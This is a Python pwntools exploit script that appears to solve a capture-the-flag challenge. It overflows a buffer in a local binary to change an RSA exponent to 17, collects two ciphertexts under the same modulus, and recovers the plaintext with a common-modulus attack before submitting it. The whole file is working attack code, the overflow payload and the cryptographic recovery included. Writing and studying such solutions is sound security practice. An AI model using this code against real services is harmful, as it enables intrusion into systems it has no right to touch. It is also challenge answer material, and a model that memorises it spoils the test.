from pwn import *
import gmpy2
context.log_level = 'debug'

p = process('./pwn')
#p = remote('XXX',XXX)

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda  : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a, b)

'''
proc_base = p.libs()[p._cwd+p.argv[0].strip('.')] # get the base address in PIE
def debug(cmd=""):
	gdb.attach(p,cmd)

cmd = ""
cmd += "b *%d\n"%(proc_base + 0x1360)
#debug(cmd)
'''

def choose(idx):
	sla(":",str(idx))

choose(1)
ru("ciphertext:")
c1 = int(ru('\n')[:-1],16)
success(hex(c1))

choose(2)
payload = 'a'*0x20 + p64(0x11)
sla(":",payload)
choose(1)
ru("ciphertext:")
c2 = int(ru('\n')[:-1],16)
success(hex(c2))

n = 0x67A737395FC8953D729633BE3F37BA438DA756FD02C74FD9E93AFB26C2E21C1FC27E5DF670FD92D21CDC2A895072F9C39A688CB30F32902A77268BD2FB60E79D7EDC130DDF608C173D1BFE8CC3B9E6A3103BC45F64C69B65BB5830C038FEDCC326E3B6ECD2ADC5686B19177E64A78DC96C8A1B052A0058DAD59AD134C79C729F
success(hex(n))

e1 = 65537
e2 = 17
s = gmpy2.gcdext(e1,e2)
s1 = s[1]
s2 = -s[2]
c2 = gmpy2.invert(c2,n)
m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n
success(hex(m))

choose(7)
sleep(0.1)
sl(str(hex(m)[2:]))

p.interactive()

#4e6b4eccdf0297f4
